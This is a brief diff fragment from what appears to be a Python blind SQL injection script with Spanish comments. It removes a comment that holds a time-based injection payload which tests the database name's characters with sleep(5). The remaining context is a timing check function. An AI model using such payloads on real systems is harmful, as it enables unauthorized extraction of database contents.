@@ -28,7 +28,6 @@ lista_columnas = []
 lista_resultados = []
 lista_columnas_tablas = []
 
-# El payload para añadir comparativa en ASCII es ' or if(ascii(substr(database(),1,1))='98',sleep(5),1)-- -
 #Función que retorna un 1 si el tiempo de espera es mayor que t
 def check(payload):
 
